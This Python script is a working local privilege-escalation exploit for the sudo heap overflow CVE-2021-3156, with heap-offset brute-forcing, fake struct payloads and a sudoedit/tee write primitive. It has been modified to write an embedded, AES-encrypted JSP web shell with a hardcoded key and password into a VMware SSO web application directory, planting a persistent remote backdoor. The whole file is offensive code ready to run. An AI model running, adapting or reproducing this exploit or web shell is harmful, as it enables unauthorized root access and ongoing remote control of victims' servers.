#!/usr/bin/python
'''
Exploit for CVE-2021-3156 with struct userspec overwrite by sleepya

This exploit requires:
- glibc without tcache
- sudo version 1.8.9-1.8.23 (inclusive)
- patient (and luck). Bruteforcing might take time (almost instant to >10 mins)

Note: Disable ASLR before running the exploit if you don't want to wait for bruteforcing

Without glibc tcache, a heap layout rarely contains hole.
The heap overflow vulnerability is triggered after parsing /etc/sudoers.
The parsing process always leaves a large hole before parsed data (struct defaults, struct userspec).

Tested on:
- CentOS 7 (1.8.23)
- Ubuntu 16.04.1
- Debian 9
- Fedora 25

sudo version related info:
v1.8.9
- change tq_pop to tailq_list
v1.8.11
- move fatal callbacks to util. so cleanup is called correctly
v1.8.19
- add line, file to userspec (chunk size 0x50)
v1.8.20
- add timeout to cmndspec
- add notbefore and notafter to cmndspec
v1.8.21
- move timeout in cmndspec to avoid padding (layout is changed)
v1.8.23
- add comments to userspec struct (chunk size 0x60)
- add ldap field in privileges chunk
v1.8.24
- add free_userpsecs() and free_defaults() with TAILQ_FIRST/TAILQ_REMOVE
'''
import os
import subprocess
import sys
import resource
import select
import signal
from struct import pack, unpack
from ctypes import cdll, c_char_p, POINTER

SUDO_PATH = b"/usr/bin/sudo"  # can be used in execve by passing argv[0] as "sudoedit"

TEE_PATH = b"/usr/bin/tee"
PASSWD_PATH = b'/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/ppp.jsp'
APPEND_CONTENT = b'<%! String xc="e961364469348209"; String pass="qpl_s"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>'

DEBUG = False

# fake defaults object for finding offsets
# expect VSYSCALL permission is "r-x" on old Linux kernel
VSYSCALL_ADDR = 0xffffffffff600000
defaults_test_obj = [
    b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\",  # defaults.next
    b"A" * 8 + pack("<Q", VSYSCALL_ADDR + 0x880) +  # prev, var (use syscall for testing first)
    b"A" * 0x20
]

libc = cdll.LoadLibrary("libc.so.6")
libc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)

resource.setrlimit(resource.RLIMIT_STACK, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))


def execve(filename, cargv, cenvp):
    libc.execve(filename, cargv, cenvp)


def spawn_raw(filename, cargv, cenvp):
    pid = os.fork()
    if pid:
        # parent
        _, exit_code = os.waitpid(pid, 0)
        return exit_code & 0xff7f  # remove coredump flag
    else:
        # child
        execve(filename, cargv, cenvp)
        exit(0)


def spawn(filename, argv, envp):
    cargv = (c_char_p * len(argv))(*argv)
    cenvp = (c_char_p * len(envp))(*envp)
    # Note: error with backtrace is print to tty directly. cannot be piped or suppressd
    r, w = os.pipe()
    pid = os.fork()
    if not pid:
        # child
        os.close(r)
        os.dup2(w, 2)
        execve(filename, cargv, cenvp)
        exit(0)
    # parent
    os.close(w)
    # might occur deadlock in heap. kill it if timeout and set exit_code as 6
    # 0.5 second should be enough for execution
    sr, _, _ = select.select([r], [], [], 0.5)
    if sr or DEBUG:
        _, exit_code = os.waitpid(pid, 0)
    else:
        # timeout, assume dead lock in heap
        os.kill(pid, signal.SIGKILL)
        _, exit_code = os.waitpid(pid, 0)
        exit_code = 6

    r = os.fdopen(r, 'r')
    err = r.read()
    r.close()
    return exit_code & 0xff7f, err  # remove coredump flag


def has_askpass(err):
    # 'sudoedit: no askpass program specified, try setting SUDO_ASKPASS'
    return 'sudoedit: no askpass program ' in err


def find_cmnd_size():
    argv = [b"sudoedit", b"-A", b"-s", PASSWD_PATH, b"", None]
    env = [b'A' * (0x401f + 0x108 - 1), b"LC_ALL=C", b"TZ=:", None]

    size_min, size_max = 0xc00, 0x2000
    found_size = 0
    while size_max - size_min > 0x10:
        curr_size = (size_min + size_max) // 2
        curr_size &= 0xfff0
        print("\ncurr size: 0x%x" % curr_size)
        argv[-2] = b"A" * (curr_size - 0x10 - len(PASSWD_PATH) - 1) + b'\\'
        exit_code, err = spawn(SUDO_PATH, argv, env)
        print("\nexit code: %d" % exit_code)
        print(err)
        if exit_code == 256 and has_askpass(err):
            # need pass. no crash.
            # fit or almost fit
            if found_size:
                found_size = curr_size
                break
            # maybe almost fit. try again
            found_size = curr_size
            size_min = curr_size
            size_max = curr_size + 0x20
        elif exit_code == 11:
            # segfault. too big
            if found_size:
                break
            size_max = curr_size
        else:
            # heap corruption. too small
            size_min = curr_size

    if found_size:
        return found_size
    assert size_min == 0x2000 - 0x10
    print('has 2 holes. very big one is bad')

    size_min, size_max = 0xc00, 0x2000
    for step in (0x400, 0x100, 0x40, 0x10):
        found = False
        env[0] = b'A' * (7 + 0x4010 + 0x110 - 1 + step + 0x100)
        for curr_size in range(size_min, size_max, step):
            argv[-2] = b"A" * (curr_size - 0x10) + b'\\'
            exit_code, err = spawn(SUDO_PATH, argv, env)
            print("\ncurr size: 0x%x" % curr_size)
            print("\nexit code: %d" % exit_code)
            print(err)
            if exit_code in (7, 11):
                size_min = curr_size
                found = True
            elif found:
                print("\nsize_min: 0x%x" % size_min)
                break
        assert found, "Cannot find cmnd size"
        size_max = size_min + step

    # TODO: verify
    return size_min


def find_defaults_chunk(argv, env_prefix):
    offset = 0
    pos = len(env_prefix) - 1
    env = env_prefix[:]
    env.extend([b"LC_ALL=C", b"TZ=:", None])
    # overflow until sudo crash without asking pass
    # crash because of defaults.entries.next is overwritten
    while True:
        env[pos] += b'A' * 0x10
        exit_code, err = spawn(SUDO_PATH, argv, env)
        # 7 bus error, 11 segfault
        if exit_code in (7, 11) and not has_askpass(err):
            # found it
            env[pos] = env[pos][:-0x10]
            break
        offset += 0x10

    # new env_prefix
    env_prefix = env[:-3]

    # tmp env_prefix for if it is defaults
    env_prefix_def = env_prefix[:]
    env_prefix_def[-1] += b'\x41\\'
    env_prefix_def.extend([b'\\', b'\\', b'\\', b'\\', b'\\', b'\\'])
    env_prefix_def.extend(defaults_test_obj)

    # verify if it is defaults
    env = env_prefix_def[:]
    env[-1] = env[-1][:-1]  # remove 1 character. no overwrite next chunk with \x00
    env.extend([b"LC_ALL=C", b"TZ=:", None])

    exit_code, err = spawn(SUDO_PATH, argv, env)
    # old sudo verion has no cleanup if authen fail. exit code is 256.
    if has_askpass(err):
        assert exit_code in (256, 11)
        # if exit_code == 256: no_cleanup = True  # old sudo version. no freeing if auth fails
        # it is defaults
        return True, offset, env_prefix_def

    # no defaults, this one is likely struct member.
    # reset offset. very rare case.
    env_prefix[-1] = env_prefix[-1][:-offset]
    return False, 0, env_prefix


def find_member_chunk(argv, env_prefix):
    # expect username ("root") chunk size 0x20 then follow by struct member
    offset = 0
    pos = len(env_prefix) - 1
    env = env_prefix[:]
    env[-1] = env[-1][:-1]
    env.extend([b"LC_ALL=C", b"TZ=:", None])
    found_heap_corruption = False
    past_member = False
    while True:
        exit_code, err = spawn(SUDO_PATH, argv, env)
        if not has_askpass(err) or (found_heap_corruption and exit_code == 11):
            assert offset > 0
            env[pos] = env[pos][:-0x10]
            offset -= 0x10
            print('decrease offset to: 0x%x' % offset)
            past_member = True
            continue
        if past_member:
            break  # found it
        if exit_code == 6:
            if found_heap_corruption:
                break
            found_heap_corruption = True
        env[pos] += b'A' * 0x30
        offset += 0x30
    print('offset member: 0x%x' % offset)
    return offset


def find_first_userspec_chunk(argv, env_prefix):
    offset_member = find_member_chunk(argv, env_prefix)

    # after user member chunk, can safely skip 0x120 because of host, cmnd, cmndspec, privileges
    SKIP_FIND_USERSPEC_SIZE = 0x120
    offset_pre = offset_member + SKIP_FIND_USERSPEC_SIZE

    pos = len(env_prefix) - 1
    env = env_prefix[:]
    env[-1] += b'A' * offset_pre + b'A' * 7 + b'\\'  # append chunk metadata
    tmp_env = env[-1]
    env.extend([
        b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\",  # next
        b"A" * 8 +  # prev
        b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\",  # users.first
        b"A" * 8 +  # users.last
        b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"",  # privileges.first
        b"LC_ALL=C", b"TZ=:", None
    ])

    offset = _brute_userspec_offset(argv, env, pos, 0x100)
    if offset is None:
        offset = _find_single_userspec_chunk(argv, env_prefix, offset_member)
        single_userspec = True
    else:
        offset += offset_pre
        single_userspec = False

    env_prefix[-1] += b'A' * offset
    return offset, env_prefix, single_userspec


def _brute_userspec_offset(argv, env, pos, max_offset):
    offset = None
    for i in range(0, max_offset, 0x10):
        exit_code, err = spawn(SUDO_PATH, argv, env)
        # print("0x%x, exit: %d" % (i, exit_code))
        # print(err)
        if has_askpass(err):
            # found. 256 for ver <= 1.8.10 (no cleanup callback. no crash)
            assert exit_code in (6, 7, 11, 256), "unexpect exit code: %d" % exit_code
            offset = i
            if exit_code == 6:
                break
        else:
            assert exit_code == 11, 'expect segfault. got exit_code: %d' % exit_code
            if offset is not None:
                break

        env[pos] = env[pos][:-1] + b'A' * 0x10 + b'\\'

    return offset;


def _find_single_userspec_chunk(argv, env_prefix, offset_member=-1):
    if offset_member == -1:
        offset_member = find_member_chunk(argv, env_prefix)

    # finding offset of only one userspec needs bruteforcing a bit
    # we need entires.prev pointing to a valid address that contains NULL pointer.
    # search valid userspec by partial overwritten entries.prev
    # Note: this offset search method is very bad if ASLR is disabled (likely to fail)
    #   For quick testing: run this exploit with ASLR enabled for getting offset.
    #   Then, disable ASLR and rerun exploit with offset arguments
    print('cannot find a userspec. assume only 1 userspec (1 rule in sudoers).')
    SKIP_FIND_USERSPEC_SIZE = 0x160
    offset_pre = offset_member + SKIP_FIND_USERSPEC_SIZE

    pos = len(env_prefix) - 1
    env = env_prefix[:]
    env[-1] += b'A' * offset_pre + b'A' * 7 + b'\\'  # append chunk metadata
    tmp_env = env[-1]
    env.extend([
        b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\",  # next
        b"", b"",
        b"LC_ALL=C", b"TZ=:", None
    ])

    # first, attempt with NULL least significant byte of prev
    offset = _brute_userspec_offset(argv, env, pos, 0xc0)
    # then, attempt with NULL 2nd least significant byte and bruteforcing least siginificat byte
    # normally, valid offset should be found in 1 round
    # if ASLR is disabed, 2nd round is useless because addresses are same as first round.
    for _ in range(2):
        if offset is not None:
            break

        for val in range(0, 0x100, 0x8):
            env[-5] = "\\" if val == 0 else pack('<B', val)
            print("val: 0x%x" % val)
            offset = _brute_userspec_offset(argv, env, pos, 0xc0)
            if offset is not None:
                break
            env[pos] = tmp_env

    assert offset is not None, "Cannot find single userspec offset.\nIf you are pretty sure of this exploit case, run an exploit again. You might have a bad luck."
    print('offset of single userspec: 0x%x' % (offset + offset_pre))
    return offset + offset_pre


# for running in sudoers case (asking password before crashed).
# find a member object offset that belongs to a running user (find until crash without asking password).
def find_target_userspec_chunk(argv, env_prefix):
    pos = len(env_prefix) - 1
    env = env_prefix[:]
    env.extend([b"LC_ALL=C", b"TZ=:", None])

    # verify current userspec is usable or not
    env[pos] += b'A' * 0x10
    exit_code, err = spawn(SUDO_PATH, argv, env)
    if exit_code == 11 and not has_askpass(err):
        return 0

    STEP = 0x100
    offset_skip = 0x180
    env[pos] += b'A' * (offset_skip - 0x10)
    tmp_env = env[pos]
    # overwrite until sudo crash without asking password
    offset_max = None
    for i in range(STEP, 0x1000, STEP):
        env[pos] += b'A' * STEP
        exit_code, err = spawn(SUDO_PATH, argv, env)
        if exit_code == 11 and not has_askpass(err):
            offset_max = i
            break
    assert offset_max, "Cannot find a target userspec offset"
    print('offset_max: 0x%x' % (offset_max + offset_skip))

    offset_min = offset_max - STEP + offset_skip
    print('offset_min: 0x%x' % offset_min)
    env = env_prefix[:]
    env[-1] += b'A' * offset_min
    env.extend([b'\\'] * 0x40)
    env.extend([b"LC_ALL=C", b"TZ=:", None])
    found_base = None
    tmp_env = env[pos]
    for i in range(0x200, -1, -0x40):
        env[pos] = tmp_env + b'A' * i + b'1234567\\'
        exit_code, err = spawn(SUDO_PATH, argv, env)
        # print("0x%x: %d" % (i, exit_code))
        if has_askpass(err):
            print('at range: 0x%x-0x%x' % (i - 0x40, i + 0x30))
            found_base = i
            break

    if found_base is None:
        return _find_single_userspec_chunk(argv, env_prefix)

    env_prefix[-1] += b'A' * offset_min
    for i in range(found_base + 0x30, found_base - 0x40, -0x10):
        if verify_target_userspec_offset(argv, env_prefix, i):
            return offset_min + i

    print('Cannot find target userspec offset')
    exit(1)


def verify_target_userspec_offset(argv, env_prefix, offset):
    env = env_prefix[:]
    env[-1] += b'A' * offset + b'1234567\\'
    env.extend([
        b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\",  # next
        b"A" * 7,  # prev
        b"LC_ALL=C", b"TZ=:", None
    ])
    exit_code, err = spawn(SUDO_PATH, argv, env)
    return has_askpass(err) and exit_code in (11, 256)


def get_sudo_version():
    proc = subprocess.Popen([SUDO_PATH, '-V'], stdout=subprocess.PIPE, bufsize=1, universal_newlines=True)
    for line in proc.stdout:
        line = line.strip()
        if not line:
            continue
        if line.startswith('Sudo version '):
            txt = line[13:].strip()
            pos = txt.rfind('p')
            if pos != -1:
                txt = txt[:pos]
            versions = list(map(int, txt.split('.')))
            break

    proc.wait()
    return versions


def check_sudo_version():
    sudo_vers = get_sudo_version()
    assert sudo_vers[0] == 1, "Unexpect sudo major version"
    assert sudo_vers[1] == 8, "Unexpect sudo minor version"
    assert sudo_vers[
               2] >= 9, "too old sudo. this exploit method is unlikely (only exploitable with rare /etc/sudoer). not implement"
    if sudo_vers[2] > 23:
        # overwrite only string of first member
        print("Warning: Only work if you known current user's password and no defaults. not implement")
        exit(0)
    return sudo_vers[2]


def create_env(offset_defaults, offset_first_userspec, offset_userspec):
    # offset_userspec
    # - 0 if only first userspec is enough
    # - -1 if only single userspec
    with open('/proc/sys/kernel/randomize_va_space') as f:
        has_aslr = int(f.read()) != 0
    if has_aslr:
        STACK_ADDR_PAGE = 0x7fffe5d35000
    else:
        STACK_ADDR_PAGE = 0x7fffffff1000  # for ASLR disabled

    SA = STACK_ADDR_PAGE

    ADDR_REFSTR = pack('<Q', SA + 0x20)  # ref string

    ADDR_PRIV_PREV = pack('<Q', SA + 0x10)
    ADDR_CMND_PREV = pack('<Q', SA + 0x18)  # cmndspec
    ADDR_MEMBER_PREV = pack('<Q', SA + 0x20)
    ADDR_USER_PREV = pack('<Q', SA + 0x38)

    ADDR_DEF_VAR = pack('<Q', SA + 0x10)
    ADDR_DEF_BINDING = pack('<Q', SA + 0x30)

    OFFSET = 0x30 + 0x20
    ADDR_MEMBER = pack('<Q', SA + OFFSET)
    ADDR_USER = pack('<Q', SA + OFFSET + 0x30)
    ADDR_CMND = pack('<Q', SA + OFFSET + 0x60 + 0x30)
    ADDR_PRIV = pack('<Q', SA + OFFSET + 0x60 + 0x30 + 0x60)

    epage = [
        b'A' * 0x8 +  # to not ending with 0x00

        # fake def->var chunk (get freed)
        b'\x21', b'', b'', b'', b'', b'', b'',
        ADDR_PRIV[:6], b'',  # pointer to privilege
        ADDR_CMND[:6], b'',  # pointer to cmndspec
        ADDR_MEMBER[:6], b'',  # pointer to member

        # fake def->binding (list head) (get freed)
        b'\x21', b'', b'', b'', b'', b'', b'',
        b'', b'', b'', b'', b'', b'', b'', b'',  # members.first
        ADDR_USER[:6], b'',  # members.last (unused, so use it for single userspec case)
        b'A' * 0x8 +  # pad

        # member chunk
        b'\x31', b'', b'', b'', b'', b'', b'',  # chunk size
        b'A' * 8 +  # member.tqe_next (can be any)
        ADDR_MEMBER_PREV[:6], b'',  # member.tqe_prev
        b'A' * 8 +  # member.name (can be any because this object is not freed)
        pack('<H', MATCH_ALL), b'',  # type, negated
        b'A' * 0xc +  # padding

        # userspec chunk (get freed)
        b'\x61', b'', b'', b'', b'', b'', b'',  # chunk metadata
        b'', b'', b'', b'', b'', b'', b'', b'',  # entries.tqe_next
        b'A' * 8 +  # entries.tqe_prev
        b'', b'', b'', b'', b'', b'', b'', b'',  # users.tqh_first
        ADDR_MEMBER[:6] + b'', b'',  # users.tqh_last
        b'', b'', b'', b'', b'', b'', b'', b'',  # privileges.tqh_first
        ADDR_PRIV[:6] + b'', b'',  # privileges.tqh_last
        b'', b'', b'', b'', b'', b'', b'', b'',  # comments.stqh_first
        ADDR_MEMBER_PREV[:6], b'',  # comments.stqh_last (can be any), file for <1.8.23
        b'A' * 8 +  # lineno (can be any)
        ADDR_MEMBER_PREV[:6], b'',  # file (ref string)
        b'A' * 8 +  # padding

        # cmndspec chunk
        b'\x61', b'', b'', b'', b'', b'', b'',  # chunk size
        # b'\x61'*0x8 + # chunk metadata (need only prev_inuse flag)
        b'A' * 0x8 +  # entries.tqe_next
        ADDR_CMND_PREV[:6], b'',  # entries.teq_prev
        b'', b'', b'', b'', b'', b'', b'', b'',  # runasuserlist
        b'', b'', b'', b'', b'', b'', b'', b'',  # runasgrouplist
        ADDR_MEMBER[:6], b'',  # cmnd
        b'\xf9' + b'\xff' * 7 +  # tag (NOPASSWD), timeout
        (b'' if sudo_ver < 20 else b'\xff' * 0x10) +  # notbefore, notafter
        (b'\xff' * 8 if sudo_ver == 20 else b'') +  # timeout for version 1.8.20
        b'', b'', b'', b'', b'', b'', b'', b'',  # role
        b'', b'', b'', b'', b'', b'', b'', b'',  # type
        (b'' if sudo_ver == 20 else b'A' * (0x18 if sudo_ver < 20 else 8)) +  # padding

        # privileges chunk
        b'\x51' * 0x8 +  # chunk metadata
        b'A' * 0x8 +  # entries.tqe_next
        ADDR_PRIV_PREV[:6], b'',  # entries.teq_prev
        (b'A' * 8 if has_ldap else b'') +  # ldap_role
        b'A' * 8 +  # hostlist.tqh_first
        ADDR_MEMBER[:6], b'',  # hostlist.tqh_last
        b'A' * 8 +  # cmndlist.tqh_first
        ADDR_CMND[:6], b'',  # cmndlist.tqh_last
        b'', b'', b'', b'', b'', b'', b'', b'',  # defaults.tqh_first
    ]

    env = [b'A' * (0x401f + 0x108)]
    if offset_defaults != -1:
        env[-1] += b'A' * (offset_defaults) + b'\x41\\'
        env.extend([
            b'\\', b'\\', b'\\', b'\\', b'\\', b'\\',  # chunk metadata
            b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\',  # next
            b'a' * 8 +  # prev
            ADDR_DEF_VAR[:6] + b'\\', b'\\',  # var
            b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\',  # val
            ADDR_DEF_BINDING[:6] + b'\\', b'\\',  # binding
            ADDR_REFSTR[:6] + b'\\', b'\\',  # file
            b"Z" * 0x8 +  # type, op, error, lineno
            b'\x31\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\',  # next
        ])
        offset_first_userspec -= 8

    chunk_size_byte = pack('B', userspec_chunk_size + 1)
    tmp = b'A' * (offset_first_userspec) + chunk_size_byte + b'\\'
    if env[-1] == b'\\':
        env.append(tmp)
    else:
        env[-1] += tmp
    env.extend([b'\\', b'\\', b'\\', b'\\', b'\\', b'\\'])  # complete userspec chunk size

    if offset_userspec != 0:
        env.extend([
            b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\',  # entries.tqe_next
            b"A" * 8 +  # entries.tqe_prev
            b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\',  # users.tqh_first
            b"A" * 8 +  # users.tqh_last
            b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\',  # privileges.tqh_first
            b"A" * 8  # privileges.tqh_last
        ])
        if userspec_chunk_size == 0x60:  # has comments
            env[-1] += '\\'
            env.extend([
                b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\',  # comments.tqh_first
                b"A" * 8  # comments.tqh_last
            ])
        if userspec_chunk_size >= 0x50:
            env[-1] += b'A' * 8 + ADDR_REFSTR[:6] + b'\\'
            env.append(b'\\')
            env.append(b'A' * 8 + b'\x21\\')  # padding, chunk size
        else:
            env[-1] += b'A' * 8 + b'\x21\\'  # padding, chunk size
        env.extend([
            b'\\', b'\\', b'\\', b'\\', b'\\', b'\\',  # need valid chunk metadata
            b'A' * (offset_userspec - userspec_chunk_size - 8 + 8 - 1) + b'\\'
        ])

    env.extend([
        # userspec chunk
        # for single userspec, sudo might pass checking and cause heap corruption when freeing
        #   stack memory (with all zero). this case is slower than other cases.
        # for >=2 userspecs, this chunk is not used because list is iterated with head->last->prev->next
        ADDR_USER[:6] + b'\\', b'\\',  # entries.tqe_next
        ADDR_USER_PREV[:6] + b'\\', b'\\',  # entries.tqe_prev
        b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\',  # users.tqh_first
        # ADDR_MEMBER[:6]+b'\\', b'\\', # users.tqh_last
        b'A' * 8 +  # users.tqh_last
        b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'',  # privileges.tqh_first
        b"LC_ALL=C",
        b"SUDO_EDITOR=" + TEE_PATH + b" -a",  # append stdin to /etc/passwd
        b"TZ=:",
    ])

    # fill spray data
    cnt = sum(map(len, epage))
    padlen = 4096 - cnt - len(epage)
    epage.append(b'P' * (padlen - 1))

    ENV_STACK_SIZE_MB = 4
    for i in range(ENV_STACK_SIZE_MB * 1024 // 4):
        env.extend(epage)

    # reserve space in last element for '/usr/bin/sudo' and padding
    env[-1] = env[-1][:-14 - 8]
    env.append(None)

    return env


def run_until_success(argv, env):
    cargv = (c_char_p * len(argv))(*argv)
    cenvp = (c_char_p * len(env))(*env)

    r, w = os.pipe()
    os.dup2(r, 0)
    w = os.fdopen(w, 'wb')
    w.write(APPEND_CONTENT)
    w.close()

    null_fd = os.open('/dev/null', os.O_RDWR)
    os.dup2(null_fd, 2)

    for i in range(65536):
        sys.stdout.write('%d\r' % i)
        if i % 8 == 0:
            sys.stdout.flush()
        exit_code = spawn_raw(SUDO_PATH, cargv, cenvp)
        if exit_code == 0:
            print("success at %d" % i)
            break
        if exit_code not in (6, 7, 11):
            print("invalid offset. exit code: %d" % exit_code)
            break


def main():
    cmnd_size = int(sys.argv[1], 0) if len(sys.argv) > 1 else None
    # -1 if no defaults
    offset_defaults = int(sys.argv[2], 0) if len(sys.argv) > 2 else None
    offset_first_userspec = int(sys.argv[3], 0) if len(sys.argv) > 3 else None
    # offset_userspec is -1 if single userspec (only 1 rule in sudoers)
    offset_userspec = int(sys.argv[4], 0) if len(sys.argv) > 4 else None

    if cmnd_size is None:
        cmnd_size = find_cmnd_size()
        print("found cmnd size: 0x%x" % cmnd_size)

    argv = [b"sudoedit", b"-A", b"-s", PASSWD_PATH, b"A" * (cmnd_size - 0x10 - len(PASSWD_PATH) - 1) + b"\\", None]

    env_prefix = [b'A' * (7 + 0x4010 + 0x110)]

    if offset_defaults is None:
        offset_defaults = -1
        found_defaults, offset, env_prefix = find_defaults_chunk(argv, env_prefix)
        if found_defaults:
            offset_defaults = offset
            print('found defaults, offset: 0x%x' % offset_defaults)
        else:
            print('no defaults in /etc/sudoers')
            offset_defaults = -1
    elif offset_defaults != -1:
        env_prefix[-1] += b'A' * offset_defaults + b'\x41\\'
        env_prefix.extend([b'\\', b'\\', b'\\', b'\\', b'\\', b'\\'])
        env_prefix.extend(defaults_test_obj)

    # first userspec offset MUST be known for cleaning up without a crash
    if offset_first_userspec is None:
        if has_fatal_cleanup:
            offset, env_prefix, single_userspec = find_first_userspec_chunk(argv, env_prefix)
            offset_first_userspec = offset
            print("\noffset to first userspec: 0x%x" % offset_first_userspec)
            if single_userspec:
                print("single userspec mode")
                offset_userspec = 0
        else:
            offset_first_userspec = 0
    else:
        env_prefix[-1] += b'A' * (offset_first_userspec)

    if offset_userspec is None:
        offset_userspec = find_target_userspec_chunk(argv, env_prefix)

    print('')
    print("cmnd size: 0x%x" % cmnd_size)
    offset_defaults_txt = -1 if offset_defaults == -1 else "0x%x" % offset_defaults
    print("offset to defaults: %s" % offset_defaults_txt)
    print("offset to first userspec: 0x%x" % offset_first_userspec)
    offset_userspec_txt = -1 if offset_userspec == -1 else "0x%x" % offset_userspec
    print("offset to userspec: %s" % offset_userspec_txt)
    print("\nto skip finding offsets next time no this machine, run: ")
    print("%s 0x%x %s 0x%x %s" % (
    sys.argv[0], cmnd_size, offset_defaults_txt, offset_first_userspec, offset_userspec_txt))

    if offset_first_userspec == 0:
        if not has_fatal_cleanup:
            print("\nTarget sudo has bug. No idea to find first userspec.")
            print("So the exploit will fail if a running user is in sudoers and not in first two rules.")
        # swap value to use only first userspec
        offset_first_userspec, offset_userspec = offset_userspec, offset_first_userspec

    env = create_env(offset_defaults, offset_first_userspec, offset_userspec)
    run_until_success(argv, env)


if __name__ == "__main__":
    # global intialization
    sudo_ver = check_sudo_version()

    DEFAULTS_CMND = 269
    if sudo_ver >= 15:
        MATCH_ALL = 284
    elif sudo_ver >= 13:
        MATCH_ALL = 282
    elif sudo_ver >= 7:
        MATCH_ALL = 280
    elif sudo_ver < 7:
        MATCH_ALL = 279
        DEFAULTS_CMND = 268

    has_fatal_cleanup = sudo_ver >= 11
    has_file = sudo_ver >= 19  # has defaults.file pointer

    has_ldap = sudo_ver >= 23
    if sudo_ver < 19:
        userspec_chunk_size = 0x40
    elif sudo_ver < 23:
        userspec_chunk_size = 0x50
    else:
        userspec_chunk_size = 0x60

    main()